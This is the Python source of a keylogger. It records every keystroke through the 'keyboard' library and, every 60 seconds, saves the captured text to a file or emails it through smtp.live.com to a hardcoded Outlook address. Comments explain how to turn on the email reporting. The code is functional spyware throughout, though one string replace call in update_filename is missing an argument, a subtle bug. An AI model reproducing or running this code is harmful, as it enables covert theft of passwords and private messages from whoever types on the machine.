import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to run the method after an 'interval' amount of time
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Initialize the parameters

SEND_REPORT_EVERY = 60 # Report Keylogs every 60 seconds  
EMAIL_ADDRESS = "devbranch2point0@outlook.com"
EMAIL_PASSWORD = ""



class Keylogger:
    def __init__(self, interval, report_method="email"):
        # Pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # This is the string variable that contains the log of all keystrokes within 'self.interval'
        self.log = ""
        # Record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        # This callback is invoked whenever a keyboard event occurs. ex. key release
        name = event.name
        if len(name) > 1:
            # not a character, special key (ex. ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # Add the key name to the global 'self.log' variable
        self.log += name

    # These methods report the logs to a local file
    def update_filename(self):
        # Construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "_").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        # Creates a log file in the current directory that contains the current keylogs in the 'self.log' variable
        # Open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    # given a message (keylogs), send the message as an email
    def prepare_mail(self, message):
        # Utility function to construct a MIMIMultipart from a text
        # It creates an HTML version and a text version to be sent as an email
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"

        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        # After making the mail, convert back to string message
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        # Manages a connection to the SMTP server (Outlook)
        server = smtplib.SMTP(host="smtp.live.com", port=587)
        # Connect to the SMTP server as TLS mode (for security)
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message after preparation
        server.sendmail(email, email, self.prepare_mail(message))
        # Terminate the session
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing: {message}")

    # Method to report keylogs after every period of time. Calls sendmail() or report_to_file() every time.
    def report(self):
        # This function gets called every 'self.interval'. Sends keylogs and resets 'self.log' variable.
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update 'self.filename'
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread dies)
        timer.daemon = True 
        # start the timer
        timer.start()

    # Define the method that calls the on_release() method
    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

if __name__ == "__main__":
        # if you want a keylogger to send to your email
        # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
        # if you want a kelogger to record keylogs to a local file
        # (and then send it using your favorite method)
        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
        keylogger.start()

    # if you want reports via email, then you should uncomment the first instantiation of report_method="email"